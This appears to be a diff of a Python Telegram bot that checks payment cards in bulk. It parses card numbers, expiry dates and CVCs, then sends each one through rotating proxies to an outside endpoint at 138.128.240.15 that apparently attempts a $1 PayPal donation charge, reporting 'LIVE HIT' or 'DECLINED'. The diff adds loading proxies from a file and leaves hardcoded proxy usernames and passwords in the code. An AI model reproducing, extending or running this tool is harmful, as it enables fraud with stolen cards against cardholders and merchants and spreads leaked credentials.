@@ -13,47 +13,69 @@ bot = telebot.TeleBot(token, parse_mode="HTML")
 admin = 7077294261
 stopuser = {}
 
-# ================== PROXIES ==================
-PROXIES = [
-    "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
-    "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
-]
+# ================== LOAD PROXIES FROM FILE ==================
+def load_proxies():
+    proxies = []
+    try:
+        with open("working_all.txt", "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith("#"):
+                    proxies.append(line)
+        print(f"✅ Loaded {len(proxies)} proxies from working_all.txt")
+    except Exception as e:
+        print(f"❌ Proxy file error: {e}")
+        proxies = ["dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85"]
+    return proxies
+
+PROXIES = load_proxies()
 
 def get_proxy():
+    if not PROXIES:
+        return None, "No Proxy"
     proxy_str = random.choice(PROXIES)
-    user, passw, host, port = proxy_str.split(':')
-    proxy_url = f"http://{user}:{passw}@{host}:{port}"
-    print(f"[{datetime.now().strftime('%H:%M:%S')}] PROXY → {host}:{port}")
-    return {"http": proxy_url, "https": proxy_url}
+    try:
+        if proxy_str.count(':') == 3:  # user:pass@host:port format
+            user, passw, host, port = proxy_str.split(':')
+            proxy_url = f"http://{user}:{passw}@{host}:{port}"
+        else:  # host:port format
+            host, port = proxy_str.split(':')
+            proxy_url = f"http://{host}:{port}"
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] PROXY → {proxy_str}")
+        return {"http": proxy_url, "https": proxy_url}, proxy_str
+    except:
+        return None, proxy_str
 
+# ================== CHECKER ==================
 def pali(ccx):
     ccx = ccx.strip()
     current_time = datetime.now().strftime('%H:%M:%S')
-    proxy_dict = get_proxy()
+    proxy_dict, proxy_used = get_proxy()
     
     print(f"[{current_time}] CHECKING → {ccx}")
     
     try:
         url = f"http://138.128.240.15:8025/paypal_donate?cc={ccx}"
-        print(f"[{current_time}] API → {url}")
+        print(f"[{current_time}] API CALL → {url}")
         
-        r = requests.get(url, proxies=proxy_dict, timeout=30)
+        r = requests.get(url, proxies=proxy_dict, timeout=25)
         text = r.text
         
         print(f"[{current_time}] STATUS → {r.status_code}")
-        print(f"[{current_time}] RES → {text[:300]}")
+        print(f"[{current_time}] RESPONSE → {text[:300]}")
         
-        if any(x in text.upper() for x in ["ORDER APPROVED", "APPROVED", "SUCCESS"]):
-            print(f"[{current_time}] ✅ CHARGED")
+        if "ORDER APPROVED" in text.upper() or "APPROVED" in text.upper() or "SUCCESS" in text.upper():
+            print(f"[{current_time}] ✅ LIVE HIT")
             return "CHARGE 1.00$"
         else:
             print(f"[{current_time}] ❌ DECLINED")
             return "DECLINED"
 
     except Exception as e:
-        print(f"[{current_time}] ERROR → {e}")
+        print(f"[{current_time}] ❌ PROXY/ERROR: {e}")
         return "ERROR"
 
+# ================== CARD REGEX ==================
 def luhn_check(number: str) -> bool:
     total = 0
     reverse_digits = number[::-1]
@@ -78,6 +100,7 @@ def reg(cc: str):
         return f"{pan}|{mm}|{yy}|{cvc}"
     return None
 
+# ================== BOT ==================
 @bot.message_handler(commands=["start"])
 def handle_start(message):
     mes = types.InlineKeyboardMarkup()
@@ -128,7 +151,7 @@ def mass_check(call):
         passs = 0
         basl = 0
 
-        bot.edit_message_text("- Processing File...", call.message.chat.id, call.message.message_id)
+        bot.edit_message_text("- Processing File with Auto Proxy...", call.message.chat.id, call.message.message_id)
 
         with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
             lines = f.readlines()
@@ -153,7 +176,7 @@ def mass_check(call):
             else:
                 basl += 1
 
-            time.sleep(6)
+            time.sleep(5)
 
         bot.edit_message_text(f"✅ Done!\nApproved: {passs}\nDeclined: {basl}\nTotal: {total}", 
                               call.message.chat.id, call.message.message_id)
@@ -166,5 +189,5 @@ def stop_check(call):
     stopuser.setdefault(uid, {})['status'] = 'stop'
     bot.answer_callback_query(call.id, "Stopped ✅")
 
-print("🚀 Bot Started Successfully")
+print("🚀 Bot Started with Auto Proxy System")
 bot.infinity_polling(none_stop=True)
